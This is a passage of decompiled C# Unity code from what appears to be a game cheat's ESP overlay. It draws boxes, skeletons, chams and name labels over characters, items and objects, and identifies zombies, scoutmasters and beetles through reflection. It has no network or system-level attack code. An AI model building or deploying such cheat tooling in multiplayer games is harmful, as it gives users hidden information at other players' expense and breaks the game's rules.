						num += 20f;
					}
				}
			}
			catch (Exception ex)
			{
				Debug.Log((object)("[ESP] Error displaying lava timer: " + ex.Message));
			}
		}

		private static void RenderObjectNames(Vector3 localPlayerPos)
		{
			if (Camera.main == null)
			{
				return;
			}
			InitializeStyles();
			Color baseColor = default(Color);
			((Color)(ref baseColor))..ctor(0.8f, 0.6f, 1f, 1f);
			float time = Time.time;
			if (_cachedObjects.Count == 0 || time - _objectCacheTime > 2f)
			{
				UpdateObjectCache();
				_objectCacheTime = time;
			}
			try
			{
				foreach (GameObject cachedObject in _cachedObjects)
				{
					if (cachedObject == null || cachedObject.transform == null)
					{
						continue;
					}
					float num = Vector3.Distance(localPlayerPos, cachedObject.transform.position);
					if (num > 10f)
					{
						continue;
					}
					Vector3 val = Camera.main.WorldToScreenPoint(cachedObject.transform.position);
					if (val.z <= 0f)
					{
						continue;
					}
					string text = ((Object)cachedObject).name ?? "GameObject";
					text = text.Replace("(Clone)", "").Trim();
					MonoBehaviour[] components = cachedObject.GetComponents<MonoBehaviour>();
					List<string> list = new List<string>();
					MonoBehaviour[] array = components;
					foreach (MonoBehaviour val2 in array)
					{
						if (!(val2 == null))
						{
							string name = ((object)val2).GetType().Name;
							if (name.Contains("Emitter") || name.Contains("Trigger") || name.Contains("Spawn") || name.Contains("Break") || name.Contains("AOE") || name.Contains("Fungus") || name.Contains("Shroom") || name.Contains("Cluster") || name.Contains("Spore") || name.Contains("Pod") || name.Contains("Puff") || name.Contains("Cloud"))
							{
								list.Add(name);
							}
						}
					}
					string text2 = text;
					if (list.Count > 0)
					{
						text2 = text2 + " [" + string.Join(", ", list) + "]";
					}
					Color distanceColor = GetDistanceColor(num, baseColor);
					DrawTextWithOutline(new Vector2(val.x, (float)Screen.height - val.y), text2, distanceColor, 11, num);
				}
			}
			catch (Exception ex)
			{
				Debug.Log((object)("[ESP] Error in RenderObjectNames: " + ex.Message));
			}
		}

		private static void DrawSimple2DBox(Bounds bounds, Color color, float lineWidth)
		{
			if (Camera.main == null)
			{
				return;
			}
			Vector3 center = ((Bounds)(ref bounds)).center;
			Vector3 extents = ((Bounds)(ref bounds)).extents;
			Vector3[] array = (Vector3[])(object)new Vector3[8]
			{
				center + new Vector3(0f - extents.x, 0f - extents.y, 0f - extents.z),
				center + new Vector3(extents.x, 0f - extents.y, 0f - extents.z),
				center + new Vector3(extents.x, extents.y, 0f - extents.z),
				center + new Vector3(0f - extents.x, extents.y, 0f - extents.z),
				center + new Vector3(0f - extents.x, 0f - extents.y, extents.z),
				center + new Vector3(extents.x, 0f - extents.y, extents.z),
				center + new Vector3(extents.x, extents.y, extents.z),
				center + new Vector3(0f - extents.x, extents.y, extents.z)
			};
			float num = float.MaxValue;
			float num2 = float.MinValue;
			float num3 = float.MaxValue;
			float num4 = float.MinValue;
			List<Vector3> list = new List<Vector3>();
			for (int i = 0; i < 8; i++)
			{
				Vector3 val = Camera.main.WorldToScreenPoint(array[i]);
				if (val.z > 0f)
				{
					list.Add(array[i]);
					num = Mathf.Min(num, val.x);
					num2 = Mathf.Max(num2, val.x);
					num3 = Mathf.Min(num3, val.y);
					num4 = Mathf.Max(num4, val.y);
				}
			}
			if (list.Count < 4)
			{
				return;
			}
			try
			{
				float[] array2 = new float[list.Count];
				float[] array3 = new float[list.Count];
				float[] array4 = new float[list.Count];
				float[] array5 = new float[list.Count];
				for (int j = 0; j < list.Count; j++)
				{
					Vector3 val2 = Camera.main.WorldToScreenPoint(list[j]);
					array2[j] = Mathf.Abs(val2.x - num);
					array3[j] = Mathf.Abs(val2.x - num2);
					array4[j] = Mathf.Abs(val2.y - num3);
					array5[j] = Mathf.Abs(val2.y - num4);
				}
				int num5 = 0;
				float num6 = array2[0] + array4[0];
				for (int k = 1; k < list.Count; k++)
				{
					float num7 = array2[k] + array4[k];
					if (num7 < num6)
					{
						num6 = num7;
						num5 = k;
					}
				}
				int num8 = 0;
				num6 = array3[0] + array4[0];
				for (int l = 1; l < list.Count; l++)
				{
					float num9 = array3[l] + array4[l];
					if (num9 < num6)
					{
						num6 = num9;
						num8 = l;
					}
				}
				int num10 = 0;
				num6 = array3[0] + array5[0];
				for (int m = 1; m < list.Count; m++)
				{
					float num11 = array3[m] + array5[m];
					if (num11 < num6)
					{
						num6 = num11;
						num10 = m;
					}
				}
				int num12 = 0;
				num6 = array2[0] + array5[0];
				for (int n = 1; n < list.Count; n++)
				{
					float num13 = array2[n] + array5[n];
					if (num13 < num6)
					{
						num6 = num13;
						num12 = n;
					}
				}
				if (num5 < list.Count && num8 < list.Count && num10 < list.Count && num12 < list.Count)
				{
					GL.Color(color);
					GL.Vertex(list[num5]);
					GL.Vertex(list[num8]);
					GL.Vertex(list[num8]);
					GL.Vertex(list[num10]);
					GL.Vertex(list[num10]);
					GL.Vertex(list[num12]);
					GL.Vertex(list[num12]);
					GL.Vertex(list[num5]);
				}
			}
			catch
			{
			}
		}

		private static void Draw3DBox(Bounds bounds, Color color, float lineWidth)
		{
			if (!(Camera.main == null))
			{
				Vector3 center = ((Bounds)(ref bounds)).center;
				Vector3 extents = ((Bounds)(ref bounds)).extents;
				Vector3[] obj = new Vector3[8]
				{
					center + new Vector3(0f - extents.x, 0f - extents.y, 0f - extents.z),
					center + new Vector3(extents.x, 0f - extents.y, 0f - extents.z),
					center + new Vector3(extents.x, extents.y, 0f - extents.z),
					center + new Vector3(0f - extents.x, extents.y, 0f - extents.z),
					center + new Vector3(0f - extents.x, 0f - extents.y, extents.z),
					center + new Vector3(extents.x, 0f - extents.y, extents.z),
					center + new Vector3(extents.x, extents.y, extents.z),
					center + new Vector3(0f - extents.x, extents.y, extents.z)
				};
				GL.Color(color);
				GL.Vertex(obj[0]);
				GL.Vertex(obj[1]);
				GL.Vertex(obj[1]);
				GL.Vertex(obj[2]);
				GL.Vertex(obj[2]);
				GL.Vertex(obj[3]);
				GL.Vertex(obj[3]);
				GL.Vertex(obj[0]);
				GL.Vertex(obj[4]);
				GL.Vertex(obj[5]);
				GL.Vertex(obj[5]);
				GL.Vertex(obj[6]);
				GL.Vertex(obj[6]);
				GL.Vertex(obj[7]);
				GL.Vertex(obj[7]);
				GL.Vertex(obj[4]);
				GL.Vertex(obj[0]);
				GL.Vertex(obj[4]);
				GL.Vertex(obj[1]);
				GL.Vertex(obj[5]);
				GL.Vertex(obj[2]);
				GL.Vertex(obj[6]);
				GL.Vertex(obj[3]);
				GL.Vertex(obj[7]);
			}
		}

		private static void DrawCornerBoxFromBounds(Bounds bounds, Color color, float lineWidth, bool is3D = false)
		{
			if (Camera.main == null)
			{
				return;
			}
			Vector3 center = ((Bounds)(ref bounds)).center;
			Vector3 extents = ((Bounds)(ref bounds)).extents;
			Vector3[] array = (Vector3[])(object)new Vector3[8]
			{
				center + new Vector3(0f - extents.x, 0f - extents.y, 0f - extents.z),
				center + new Vector3(extents.x, 0f - extents.y, 0f - extents.z),
				center + new Vector3(extents.x, extents.y, 0f - extents.z),
				center + new Vector3(0f - extents.x, extents.y, 0f - extents.z),
				center + new Vector3(0f - extents.x, 0f - extents.y, extents.z),
				center + new Vector3(extents.x, 0f - extents.y, extents.z),
				center + new Vector3(extents.x, extents.y, extents.z),
				center + new Vector3(0f - extents.x, extents.y, extents.z)
			};
			Vector3[] screenCorners = (Vector3[])(object)new Vector3[8];
			bool[] array2 = new bool[8];
			int num = 0;
			for (int i = 0; i < 8; i++)
			{
				screenCorners[i] = Camera.main.WorldToScreenPoint(array[i]);
				array2[i] = screenCorners[i].z > 0f;
				if (array2[i])
				{
					num++;
				}
			}
			if (num < 4)
			{
				return;
			}
			GL.Color(color);
			if (is3D)
			{
				if (array2[0] && array2[1])
				{
					GL.Vertex(array[0]);
					GL.Vertex(array[1]);
				}
				if (array2[1] && array2[2])
				{
					GL.Vertex(array[1]);
					GL.Vertex(array[2]);
				}
				if (array2[2] && array2[3])
				{
					GL.Vertex(array[2]);
					GL.Vertex(array[3]);
				}
				if (array2[3] && array2[0])
				{
					GL.Vertex(array[3]);
					GL.Vertex(array[0]);
				}
				if (array2[4] && array2[5])
				{
					GL.Vertex(array[4]);
					GL.Vertex(array[5]);
				}
				if (array2[5] && array2[6])
				{
					GL.Vertex(array[5]);
					GL.Vertex(array[6]);
				}
				if (array2[6] && array2[7])
				{
					GL.Vertex(array[6]);
					GL.Vertex(array[7]);
				}
				if (array2[7] && array2[4])
				{
					GL.Vertex(array[7]);
					GL.Vertex(array[4]);
				}
				if (array2[0] && array2[4])
				{
					GL.Vertex(array[0]);
					GL.Vertex(array[4]);
				}
				if (array2[1] && array2[5])
				{
					GL.Vertex(array[1]);
					GL.Vertex(array[5]);
				}
				if (array2[2] && array2[6])
				{
					GL.Vertex(array[2]);
					GL.Vertex(array[6]);
				}
				if (array2[3] && array2[7])
				{
					GL.Vertex(array[3]);
					GL.Vertex(array[7]);
				}
				return;
			}
			List<int> list = new List<int>();
			for (int j = 0; j < 8; j++)
			{
				if (array2[j])
				{
					list.Add(j);
				}
			}
			list.Sort((int a, int b) => screenCorners[a].z.CompareTo(screenCorners[b].z));
			int[] array3 = new int[4];
			int num2 = 0;
			for (int k = 0; k < Mathf.Min(list.Count, 6); k++)
			{
				if (num2 >= 4)
				{
					break;
				}
				int num3 = list[k];
				if (num2 < 4)
				{
					array3[num2] = num3;
					num2++;
				}
			}
			if (num2 == 4)
			{
				Array.Sort(array3, delegate(int a, int b)
				{
					int num4 = screenCorners[a].y.CompareTo(screenCorners[b].y);
					return (num4 != 0) ? num4 : screenCorners[a].x.CompareTo(screenCorners[b].x);
				});
				GL.Vertex(array[array3[0]]);
				GL.Vertex(array[array3[1]]);
				GL.Vertex(array[array3[1]]);
				GL.Vertex(array[array3[2]]);
				GL.Vertex(array[array3[2]]);
				GL.Vertex(array[array3[3]]);
				GL.Vertex(array[array3[3]]);
				GL.Vertex(array[array3[0]]);
			}
			else if (array2[0] && array2[1] && array2[2] && array2[3])
			{
				GL.Vertex(array[0]);
				GL.Vertex(array[1]);
				GL.Vertex(array[1]);
				GL.Vertex(array[2]);
				GL.Vertex(array[2]);
				GL.Vertex(array[3]);
				GL.Vertex(array[3]);
				GL.Vertex(array[0]);
			}
		}

		private static void DrawSkeleton(Character character, Color color)
		{
			if (character == null || character.refs == null || Camera.main == null)
			{
				return;
			}
			if (character.refs.ragdoll != null && character.refs.ragdoll.partDict != null)
			{
				DrawSkeletonFromRagdoll(character, color);
				return;
			}
			Animator val = character.refs?.animator ?? ((Component)character).GetComponent<Animator>();
			if (val != null && val.isHuman)
			{
				DrawSkeletonFromAnimator(val, color);
			}
		}

		private static void DrawSkeletonFromRagdoll(Character character, Color color)
		{
			Dictionary<BodypartType, Bodypart> partDict = character.refs.ragdoll.partDict;
			if (partDict != null)
			{
				Transform val = ((partDict.ContainsKey((BodypartType)4) && (Object)(object)partDict[(BodypartType)4] != (Object)null) ? ((Component)partDict[(BodypartType)4]).transform : null);
				Transform val2 = ((partDict.ContainsKey((BodypartType)3) && (Object)(object)partDict[(BodypartType)3] != (Object)null) ? ((Component)partDict[(BodypartType)3]).transform : null);
				Transform val3 = ((partDict.ContainsKey((BodypartType)2) && (Object)(object)partDict[(BodypartType)2] != (Object)null) ? ((Component)partDict[(BodypartType)2]).transform : null);
				Transform val4 = ((partDict.ContainsKey((BodypartType)0) && (Object)(object)partDict[(BodypartType)0] != (Object)null) ? ((Component)partDict[(BodypartType)0]).transform : null);
				Transform val5 = ((partDict.ContainsKey((BodypartType)25) && (Object)(object)partDict[(BodypartType)25] != (Object)null) ? ((Component)partDict[(BodypartType)25]).transform : null);
				Transform val6 = ((partDict.ContainsKey((BodypartType)5) && (Object)(object)partDict[(BodypartType)5] != (Object)null) ? ((Component)partDict[(BodypartType)5]).transform : null);
				Transform val7 = ((partDict.ContainsKey((BodypartType)6) && (Object)(object)partDict[(BodypartType)6] != (Object)null) ? ((Component)partDict[(BodypartType)6]).transform : null);
				Transform val8 = ((partDict.ContainsKey((BodypartType)7) && (Object)(object)partDict[(BodypartType)7] != (Object)null) ? ((Component)partDict[(BodypartType)7]).transform : null);
				Transform val9 = ((partDict.ContainsKey((BodypartType)26) && (Object)(object)partDict[(BodypartType)26] != (Object)null) ? ((Component)partDict[(BodypartType)26]).transform : null);
				Transform val10 = ((partDict.ContainsKey((BodypartType)8) && (Object)(object)partDict[(BodypartType)8] != (Object)null) ? ((Component)partDict[(BodypartType)8]).transform : null);
				Transform val11 = ((partDict.ContainsKey((BodypartType)9) && (Object)(object)partDict[(BodypartType)9] != (Object)null) ? ((Component)partDict[(BodypartType)9]).transform : null);
				Transform val12 = ((partDict.ContainsKey((BodypartType)10) && (Object)(object)partDict[(BodypartType)10] != (Object)null) ? ((Component)partDict[(BodypartType)10]).transform : null);
				Transform val13 = ((partDict.ContainsKey((BodypartType)11) && (Object)(object)partDict[(BodypartType)11] != (Object)null) ? ((Component)partDict[(BodypartType)11]).transform : null);
				Transform val14 = ((partDict.ContainsKey((BodypartType)12) && (Object)(object)partDict[(BodypartType)12] != (Object)null) ? ((Component)partDict[(BodypartType)12]).transform : null);
				Transform val15 = ((partDict.ContainsKey((BodypartType)13) && (Object)(object)partDict[(BodypartType)13] != (Object)null) ? ((Component)partDict[(BodypartType)13]).transform : null);
				Transform val16 = ((partDict.ContainsKey((BodypartType)14) && (Object)(object)partDict[(BodypartType)14] != (Object)null) ? ((Component)partDict[(BodypartType)14]).transform : null);
				Transform val17 = ((partDict.ContainsKey((BodypartType)15) && (Object)(object)partDict[(BodypartType)15] != (Object)null) ? ((Component)partDict[(BodypartType)15]).transform : null);
				Transform val18 = ((partDict.ContainsKey((BodypartType)16) && (Object)(object)partDict[(BodypartType)16] != (Object)null) ? ((Component)partDict[(BodypartType)16]).transform : null);
				if (val != null && val2 != null)
				{
					DrawGLLineWorldSpace(val.position, val2.position, color);
				}
				if (val2 != null && val3 != null)
				{
					DrawGLLineWorldSpace(val2.position, val3.position, color);
				}
				if (val3 != null && val4 != null)
				{
					DrawGLLineWorldSpace(val3.position, val4.position, color);
				}
				if (val2 != null && val5 != null)
				{
					DrawGLLineWorldSpace(val2.position, val5.position, color);
				}
				if (val5 != null && val6 != null)
				{
					DrawGLLineWorldSpace(val5.position, val6.position, color);
				}
				if (val6 != null && val7 != null)
				{
					DrawGLLineWorldSpace(val6.position, val7.position, color);
				}
				if (val7 != null && val8 != null)
				{
					DrawGLLineWorldSpace(val7.position, val8.position, color);
				}
				if (val2 != null && val9 != null)
				{
					DrawGLLineWorldSpace(val2.position, val9.position, color);
				}
				if (val9 != null && val10 != null)
				{
					DrawGLLineWorldSpace(val9.position, val10.position, color);
				}
				if (val10 != null && val11 != null)
				{
					DrawGLLineWorldSpace(val10.position, val11.position, color);
				}
				if (val11 != null && val12 != null)
				{
					DrawGLLineWorldSpace(val11.position, val12.position, color);
				}
				if (val4 != null && val13 != null)
				{
					DrawGLLineWorldSpace(val4.position, val13.position, color);
				}
				if (val13 != null && val14 != null)
				{
					DrawGLLineWorldSpace(val13.position, val14.position, color);
				}
				if (val14 != null && val15 != null)
				{
					DrawGLLineWorldSpace(val14.position, val15.position, color);
				}
				if (val4 != null && val16 != null)
				{
					DrawGLLineWorldSpace(val4.position, val16.position, color);
				}
				if (val16 != null && val17 != null)
				{
					DrawGLLineWorldSpace(val16.position, val17.position, color);
				}
				if (val17 != null && val18 != null)
				{
					DrawGLLineWorldSpace(val17.position, val18.position, color);
				}
			}
		}

		private static void DrawSkeletonFromAnimator(Animator animator, Color color)
		{
			DrawBoneLineGL(animator, (HumanBodyBones)10, (HumanBodyBones)9, color);
			DrawBoneLineGL(animator, (HumanBodyBones)9, (HumanBodyBones)7, color);
			DrawBoneLineGL(animator, (HumanBodyBones)7, (HumanBodyBones)0, color);
			DrawBoneLineGL(animator, (HumanBodyBones)9, (HumanBodyBones)11, color);
			DrawBoneLineGL(animator, (HumanBodyBones)11, (HumanBodyBones)13, color);
			DrawBoneLineGL(animator, (HumanBodyBones)13, (HumanBodyBones)15, color);
			DrawBoneLineGL(animator, (HumanBodyBones)15, (HumanBodyBones)17, color);
			DrawBoneLineGL(animator, (HumanBodyBones)9, (HumanBodyBones)12, color);
			DrawBoneLineGL(animator, (HumanBodyBones)12, (HumanBodyBones)14, color);
			DrawBoneLineGL(animator, (HumanBodyBones)14, (HumanBodyBones)16, color);
			DrawBoneLineGL(animator, (HumanBodyBones)16, (HumanBodyBones)18, color);
			DrawBoneLineGL(animator, (HumanBodyBones)0, (HumanBodyBones)1, color);
			DrawBoneLineGL(animator, (HumanBodyBones)1, (HumanBodyBones)3, color);
			DrawBoneLineGL(animator, (HumanBodyBones)3, (HumanBodyBones)5, color);
			DrawBoneLineGL(animator, (HumanBodyBones)0, (HumanBodyBones)2, color);
			DrawBoneLineGL(animator, (HumanBodyBones)2, (HumanBodyBones)4, color);
			DrawBoneLineGL(animator, (HumanBodyBones)4, (HumanBodyBones)6, color);
		}

		private static void DrawBoneLineGL(Animator animator, HumanBodyBones bone1, HumanBodyBones bone2, Color color)
		{
			if (!(animator == null))
			{
				Transform boneTransform = animator.GetBoneTransform(bone1);
				Transform boneTransform2 = animator.GetBoneTransform(bone2);
				if (boneTransform != null && boneTransform2 != null)
				{
					DrawGLLineWorldSpace(boneTransform.position, boneTransform2.position, color);
				}
			}
		}

		private static void DrawGLLineWorldSpace(Vector3 start, Vector3 end, Color color)
		{
			GL.Color(color);
			GL.Vertex(start);
			GL.Vertex(end);
		}

		private static void DrawChamsBoxScreenSpace(Bounds bounds, Color color)
		{
			if (Camera.main == null || _whiteTexture == null)
			{
				return;
			}
			Vector3 center = ((Bounds)(ref bounds)).center;
			Vector3 extents = ((Bounds)(ref bounds)).extents;
			Vector3[] array = (Vector3[])(object)new Vector3[4]
			{
				center + new Vector3(0f - extents.x, 0f - extents.y, 0f - extents.z),
				center + new Vector3(extents.x, 0f - extents.y, 0f - extents.z),
				center + new Vector3(extents.x, extents.y, 0f - extents.z),
				center + new Vector3(0f - extents.x, extents.y, 0f - extents.z)
			};
			Vector2?[] array2 = new Vector2?[4];
			bool flag = true;
			for (int i = 0; i < 4; i++)
			{
				Vector3 val = Camera.main.WorldToScreenPoint(array[i]);
				if (val.z > 0f)
				{
					array2[i] = new Vector2(val.x, (float)Screen.height - val.y);
					continue;
				}
				flag = false;
				break;
			}
			if (flag)
			{
				GUI.color = color;
				if (array2[0].HasValue && array2[1].HasValue && array2[2].HasValue && array2[3].HasValue)
				{
					float num = Mathf.Min(new float[4]
					{
						array2[0].Value.x,
						array2[1].Value.x,
						array2[2].Value.x,
						array2[3].Value.x
					});
					float num2 = Mathf.Max(new float[4]
					{
						array2[0].Value.x,
						array2[1].Value.x,
						array2[2].Value.x,
						array2[3].Value.x
					});
					float num3 = Mathf.Min(new float[4]
					{
						array2[0].Value.y,
						array2[1].Value.y,
						array2[2].Value.y,
						array2[3].Value.y
					});
					float num4 = Mathf.Max(new float[4]
					{
						array2[0].Value.y,
						array2[1].Value.y,
						array2[2].Value.y,
						array2[3].Value.y
					});
					GUI.DrawTexture(new Rect(num, num3, num2 - num, num4 - num3), (Texture)(object)_whiteTexture);
					Color color2 = color;
					color2.a = 1f;
					DrawLineScreenSpace(array2[0].Value, array2[1].Value, color2, 2f);
					DrawLineScreenSpace(array2[1].Value, array2[2].Value, color2, 2f);
					DrawLineScreenSpace(array2[2].Value, array2[3].Value, color2, 2f);
					DrawLineScreenSpace(array2[3].Value, array2[0].Value, color2, 2f);
				}
				GUI.color = Color.white;
			}
		}

		private static void DrawLineScreenSpace(Vector2 start, Vector2 end, Color color, float width)
		{
			if (!(_whiteTexture == null))
			{
				Vector2 val = end - start;
				Vector2 normalized = ((Vector2)(ref val)).normalized;
				float num = Mathf.Atan2(normalized.y, normalized.x) * 57.29578f;
				float num2 = Vector2.Distance(start, end);
				Matrix4x4 matrix = GUI.matrix;
				GUI.color = color;
				GUIUtility.RotateAroundPivot(num, start);
				GUI.DrawTexture(new Rect(start.x, start.y - width / 2f, num2, width), (Texture)(object)_whiteTexture);
				GUI.matrix = matrix;
				GUI.color = Color.white;
			}
		}

		private static void DrawTextWithOutline(Vector2 position, string text, Color textColor, int fontSize, float distance = 0f)
		{
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			Color textColor2 = textColor;
			int num = 1;
			if (distance > 50f)
			{
				float num2 = Mathf.Clamp01((distance - 50f) / 100f);
				textColor2 = Color.Lerp(textColor, Color.white, num2 * 0.7f);
				textColor2.a = Mathf.Lerp(textColor.a, 1f, num2 * 0.5f);
				num = ((!(distance > 100f)) ? 1 : 2);
			}
			_textStyle.fontSize = fontSize;
			_textStyle.normal.textColor = textColor2;
			_outlineStyle.fontSize = fontSize;
			_outlineStyle.normal.textColor = new Color(0f, 0f, 0f, 0.9f);
			Vector2 val = _textStyle.CalcSize(new GUIContent(text));
			Vector2 val2 = default(Vector2);
			((Vector2)(ref val2))..ctor(position.x - val.x / 2f, position.y);
			for (int i = -num; i <= num; i++)
			{
				for (int j = -num; j <= num; j++)
				{
					if (i != 0 || j != 0)
					{
						GUI.Label(new Rect(val2.x + (float)i, val2.y + (float)j, val.x, val.y), text, _outlineStyle);
					}
				}
			}
			GUI.Label(new Rect(val2.x, val2.y, val.x, val.y), text, _textStyle);
		}

		private static Bounds GetCharacterBounds(Character character)
		{
			Bounds result;
			if (character == null)
			{
				result = default(Bounds);
				return result;
			}
			Vector3 position = character.transform.position;
			Bounds result2 = default(Bounds);
			((Bounds)(ref result2))..ctor(position, Vector3.zero);
			bool flag = false;
			Vector3 size;
			if (character.refs != null && character.refs.ragdoll != null && character.refs.ragdoll.partDict != null)
			{
				foreach (KeyValuePair<BodypartType, Bodypart> item in character.refs.ragdoll.partDict)
				{
					if (!(item.Value != null) || !((Object)(object)item.Value.transform != (Object)null))
					{
						continue;
					}
					Collider component = ((Component)item.Value).GetComponent<Collider>();
					if (component != null)
					{
						result = component.bounds;
						size = ((Bounds)(ref result)).size;
						if ((size).magnitude > 0.01f)
						{
							if (!flag)
							{
								result2 = component.bounds;
								flag = true;
							}
							else
							{
								((Bounds)(ref result2)).Encapsulate(component.bounds);
							}
							continue;
						}
					}
					Vector3 position2 = item.Value.transform.position;
					if (!flag)
					{
						result2 = new Bounds(position2, Vector3.zero);
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(position2);
					}
				}
			}
			if (!flag)
			{
				Renderer[] componentsInChildren = ((Component)character).GetComponentsInChildren<Renderer>(true);
				foreach (Renderer val in componentsInChildren)
				{
					if (!(val != null))
					{
						continue;
					}
					result = val.bounds;
					size = ((Bounds)(ref result)).size;
					if ((size).magnitude > 0.01f)
					{
						if (!flag)
						{
							result2 = val.bounds;
							flag = true;
						}
						else
						{
							((Bounds)(ref result2)).Encapsulate(val.bounds);
						}
					}
				}
			}
			Collider[] componentsInChildren2 = ((Component)character).GetComponentsInChildren<Collider>(true);
			foreach (Collider val2 in componentsInChildren2)
			{
				if (!(val2 != null))
				{
					continue;
				}
				result = val2.bounds;
				size = ((Bounds)(ref result)).size;
				if ((size).magnitude > 0.01f)
				{
					if (!flag)
					{
						result2 = val2.bounds;
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(val2.bounds);
					}
				}
			}
			if (!flag && character.refs != null && character.refs.head != null && character.refs.hip != null)
			{
				Vector3 position3 = character.refs.head.transform.position;
				Vector3 position4 = character.refs.hip.transform.position;
				float num = Vector3.Distance(position3, position4) * 1.5f;
				Vector3 val3 = (position3 + position4) / 2f;
				((Bounds)(ref result2))..ctor(val3, new Vector3(0.5f, num, 0.5f));
				flag = true;
			}
			if (!flag)
			{
				Animator val4 = character.refs?.animator ?? ((Component)character).GetComponent<Animator>();
				if (val4 != null && val4.isHuman)
				{
					Transform boneTransform = val4.GetBoneTransform((HumanBodyBones)10);
					Transform boneTransform2 = val4.GetBoneTransform((HumanBodyBones)5);
					if (boneTransform != null && boneTransform2 != null)
					{
						float num2 = Vector3.Distance(boneTransform.position, boneTransform2.position);
						((Bounds)(ref result2))..ctor(position + Vector3.up * (num2 / 2f), new Vector3(0.5f, num2, 0.5f));
						flag = true;
					}
				}
			}
			if (!flag)
			{
				((Bounds)(ref result2))..ctor(position + Vector3.up * 0.875f, new Vector3(0.5f, 1.75f, 0.5f));
			}
			size = ((Bounds)(ref result2)).size;
			if ((size).magnitude < 0.1f)
			{
				((Bounds)(ref result2))..ctor(((Bounds)(ref result2)).center, new Vector3(0.5f, 1.75f, 0.5f));
			}
			return result2;
		}

		private static Bounds GetItemBounds(Item item)
		{
			Bounds result;
			if (item == null || (Object)(object)item.gameObject == (Object)null)
			{
				result = default(Bounds);
				return result;
			}
			Bounds result2 = default(Bounds);
			((Bounds)(ref result2))..ctor(item.transform.position, Vector3.zero);
			bool flag = false;
			Renderer[] componentsInChildren = ((Component)item).GetComponentsInChildren<Renderer>(true);
			foreach (Renderer val in componentsInChildren)
			{
				if (!(val != null))
				{
					continue;
				}
				result = val.bounds;
				Vector3 size = ((Bounds)(ref result)).size;
				if ((size).magnitude > 0.01f)
				{
					if (!flag)
					{
						result2 = val.bounds;
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(val.bounds);
					}
				}
			}
			Collider[] componentsInChildren2 = ((Component)item).GetComponentsInChildren<Collider>(true);
			foreach (Collider val2 in componentsInChildren2)
			{
				if (val2 != null)
				{
					if (!flag)
					{
						result2 = val2.bounds;
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(val2.bounds);
					}
				}
			}
			if (!flag)
			{
				MeshFilter[] componentsInChildren3 = ((Component)item).GetComponentsInChildren<MeshFilter>(true);
				Bounds val6 = default(Bounds);
				foreach (MeshFilter val3 in componentsInChildren3)
				{
					if (val3 != null && val3.sharedMesh != null)
					{
						Bounds bounds = val3.sharedMesh.bounds;
						Vector3 val4 = val3.transform.TransformPoint(((Bounds)(ref bounds)).center);
						Vector3 val5 = val3.transform.TransformVector(((Bounds)(ref bounds)).size);
						((Bounds)(ref val6))..ctor(val4, val5);
						if (!flag)
						{
							result2 = val6;
							flag = true;
						}
						else
						{
							((Bounds)(ref result2)).Encapsulate(val6);
						}
					}
				}
			}
			if (!flag)
			{
				((Bounds)(ref result2))..ctor(item.transform.position, Vector3.one * 0.5f);
			}
			return result2;
		}

		private static Bounds GetObjectBounds(GameObject obj)
		{
			Bounds result;
			if (obj == null)
			{
				result = default(Bounds);
				return result;
			}
			Bounds result2 = default(Bounds);
			((Bounds)(ref result2))..ctor(obj.transform.position, Vector3.zero);
			bool flag = false;
			Renderer[] componentsInChildren = obj.GetComponentsInChildren<Renderer>(true);
			foreach (Renderer val in componentsInChildren)
			{
				if (!(val != null))
				{
					continue;
				}
				result = val.bounds;
				Vector3 size = ((Bounds)(ref result)).size;
				if ((size).magnitude > 0.01f)
				{
					if (!flag)
					{
						result2 = val.bounds;
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(val.bounds);
					}
				}
			}
			Collider[] componentsInChildren2 = obj.GetComponentsInChildren<Collider>(true);
			foreach (Collider val2 in componentsInChildren2)
			{
				if (val2 != null)
				{
					if (!flag)
					{
						result2 = val2.bounds;
						flag = true;
					}
					else
					{
						((Bounds)(ref result2)).Encapsulate(val2.bounds);
					}
				}
			}
			if (!flag)
			{
				MeshFilter[] componentsInChildren3 = obj.GetComponentsInChildren<MeshFilter>(true);
				Bounds val6 = default(Bounds);
				foreach (MeshFilter val3 in componentsInChildren3)
				{
					if (val3 != null && val3.sharedMesh != null)
					{
						Bounds bounds = val3.sharedMesh.bounds;
						Vector3 val4 = val3.transform.TransformPoint(((Bounds)(ref bounds)).center);
						Vector3 val5 = val3.transform.TransformVector(((Bounds)(ref bounds)).size);
						((Bounds)(ref val6))..ctor(val4, val5);
						if (!flag)
						{
							result2 = val6;
							flag = true;
						}
						else
						{
							((Bounds)(ref result2)).Encapsulate(val6);
						}
					}
				}
			}
			if (!flag)
			{
				((Bounds)(ref result2))..ctor(obj.transform.position, Vector3.one * 0.5f);
			}
			return result2;
		}

		private static Vector3 GetEntityHeadPosition(GameObject entity, Character charComponent)
		{
			if (charComponent != null && charComponent.refs != null && charComponent.refs.head != null)
			{
				return charComponent.refs.head.transform.position + Vector3.up * 0.3f;
			}
			if (charComponent != null)
			{
				Animator component = ((Component)charComponent).GetComponent<Animator>();
				if (component != null)
				{
					Transform boneTransform = component.GetBoneTransform((HumanBodyBones)10);
					if (boneTransform != null)
					{
						return boneTransform.position + Vector3.up * 0.3f;
					}
				}
			}
			return entity.transform.position + Vector3.up * 1.8f;
		}

		private static string GetEntityType(GameObject entity)
		{
			if (entity == null)
			{
				return "Unknown";
			}
			Character component = entity.GetComponent<Character>();
			MonoBehaviour[] components;
			if (component != null)
			{
				try
				{
					FieldInfo field = typeof(Character).GetField("isZombie", BindingFlags.Instance | BindingFlags.Public);
					FieldInfo field2 = typeof(Character).GetField("isScoutmaster", BindingFlags.Instance | BindingFlags.Public);
					if (field != null && (bool)field.GetValue(component))
					{
						return "Zombie";
					}
					if (field2 != null && (bool)field2.GetValue(component))
					{
						return "Scoutmaster";
					}
				}
				catch
				{
				}
				components = entity.GetComponents<MonoBehaviour>();
				foreach (MonoBehaviour val in components)
				{
					if (val == null)
					{
						continue;
					}
					string name = ((object)val).GetType().Name;
					switch (name)
					{
					case "Scoutmaster":
						return "Scoutmaster";
					case "MushroomZombie":
						return "Zombie";
					case "Beetle":
						return "Beetle";
					}
					if (name.Contains("Scoutmaster"))
					{
						return "Scoutmaster";
					}
					if (name.Contains("Zombie"))
					{
						return "Zombie";
					}
					if (name.Contains("Beetle"))
					{
						return "Beetle";
					}
				}
